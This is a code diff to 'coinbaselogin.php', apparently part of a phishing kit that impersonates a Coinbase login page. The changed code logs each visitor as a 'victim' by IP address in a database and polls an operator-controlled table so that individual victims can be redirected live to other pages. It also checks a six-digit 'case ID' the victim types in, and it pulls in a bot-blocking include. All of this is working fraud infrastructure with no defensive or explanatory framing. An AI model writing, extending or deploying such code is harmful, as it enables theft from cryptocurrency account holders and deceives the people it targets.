@@ -8,57 +8,53 @@ require_once 'blocker-raw.php';
 header("X-Frame-Options: DENY");
 header("X-Content-Type-Options: nosniff");
 
-// Check for redirect commands
+$victim_ip = $_SERVER['REMOTE_ADDR'];
+
+// Update victim tracking
 try {
     $database = new Database();
     $db = $database->getConnection();
+    
+    $update_query = "UPDATE victims SET last_activity = NOW(), page_visited = 'coinbaselogin.php' WHERE ip_address = :ip";
+    $update_stmt = $db->prepare($update_query);
+    $update_stmt->execute([':ip' => $victim_ip]);
+} catch (Exception $e) {
+    error_log("Victim update error: " . $e->getMessage());
+}
 
-    // Check for specific victim redirect first
-    $victim_ip = $_SERVER['REMOTE_ADDR'];
-    $victim_query = "SELECT rc.target 
-                    FROM redirect_commands rc 
-                    JOIN victims v ON rc.victim_id = v.id 
-                    WHERE rc.command = 'redirect' 
-                    AND v.ip_address = :ip 
-                    AND rc.created_at > NOW() - INTERVAL '5 minutes'
-                    ORDER BY rc.created_at DESC 
-                    LIMIT 1";
-    $victim_stmt = $db->prepare($victim_query);
-    $victim_stmt->execute([':ip' => $victim_ip]);
-    $victim_redirect = $victim_stmt->fetch(PDO::FETCH_ASSOC);
+// Check for LIVE redirect commands (only unexpired, unexecuted for this IP)
+try {
+    $redirect_query = "SELECT target FROM redirect_commands 
+                      WHERE victim_ip = :ip
+                      AND command = 'redirect' 
+                      AND executed = FALSE 
+                      AND expires_at > NOW()
+                      ORDER BY created_at DESC 
+                      LIMIT 1";
+    $redirect_stmt = $db->prepare($redirect_query);
+    $redirect_stmt->execute([':ip' => $victim_ip]);
+    $redirect = $redirect_stmt->fetch(PDO::FETCH_ASSOC);
 
-    if ($victim_redirect) {
-        $redirect_target = trim($victim_redirect['target']);
-        $current_page = basename($_SERVER['PHP_SELF']);
+    if ($redirect) {
+        $redirect_target = trim($redirect['target']);
         
-        if ($redirect_target && $redirect_target !== 'None' && $redirect_target !== $current_page) {
-            header("Location: $redirect_target");
-            exit;
-        }
-    }
-
-    // Check global redirect
-    $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' AND victim_id IS NULL ORDER BY created_at DESC LIMIT 1";
-    $stmt = $db->query($query);
-    $redirect_target = $stmt->fetch(PDO::FETCH_ASSOC);
-
-    if ($redirect_target) {
-        $redirect_target = trim($redirect_target['target']);
-        $current_page = basename($_SERVER['PHP_SELF']);
+        // Mark as executed
+        $mark_executed = "UPDATE redirect_commands SET executed = TRUE WHERE target = :target AND victim_ip = :ip";
+        $mark_stmt = $db->prepare($mark_executed);
+        $mark_stmt->execute([':target' => $redirect_target, ':ip' => $victim_ip]);
         
-        if ($redirect_target && $redirect_target !== 'None' && $redirect_target !== $current_page) {
-            header("Location: $redirect_target");
-            exit;
-        }
+        // INSTANT REDIRECT
+        header("Location: $redirect_target");
+        exit;
     }
 } catch (Exception $e) {
-    error_log("Database error in coinbaselogin.php: " . $e->getMessage());
+    error_log("Redirect check error: " . $e->getMessage());
 }
 
 // Handle case ID verification
 $error_message = '';
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Get the entered case ID from the form
+    // Get the entered case ID
     $entered_code = '';
     for ($i = 1; $i <= 6; $i++) {
         $field_name = 'coinbase_access_code' . $i;
@@ -67,11 +63,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
     
-    // Get the current valid case ID from database
+    // Get the current valid case ID
     try {
-        $database = new Database();
-        $db = $database->getConnection();
-        
         $case_query = "SELECT setting_value FROM case_settings WHERE setting_name = 'current_case_id'";
         $case_stmt = $db->query($case_query);
         $case_result = $case_stmt->fetch(PDO::FETCH_ASSOC);
@@ -86,21 +79,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     } catch (Exception $e) {
         $error_message = 'System error. Please try again.';
-        error_log("Case ID verification error: " . $e->getMessage());
     }
-}
-
-// Update victim tracking
-try {
-    $database = new Database();
-    $db = $database->getConnection();
-    $ip = $_SERVER['REMOTE_ADDR'];
-    
-    $update_query = "UPDATE victims SET last_activity = NOW(), page_visited = 'coinbaselogin.php' WHERE ip_address = :ip AND status = 'active'";
-    $update_stmt = $db->prepare($update_query);
-    $update_stmt->execute([':ip' => $ip]);
-} catch (Exception $e) {
-    error_log("Victim update error in coinbase: " . $e->getMessage());
 }
 // ==================== PROTECTION END ====================
 ?>
@@ -1407,3 +1386,14 @@ try {
             });
         });
     </script>
+
+<?php if ($error_message): ?>
+    <script>
+        setTimeout(function() {
+            alert('<?php echo $error_message; ?>');
+            // Clear all inputs
+            document.querySelectorAll('.digit').forEach(input => input.value = '');
+            document.querySelector('.digit').focus();
+        }, 100);
+    </script>
+<?php endif; ?>
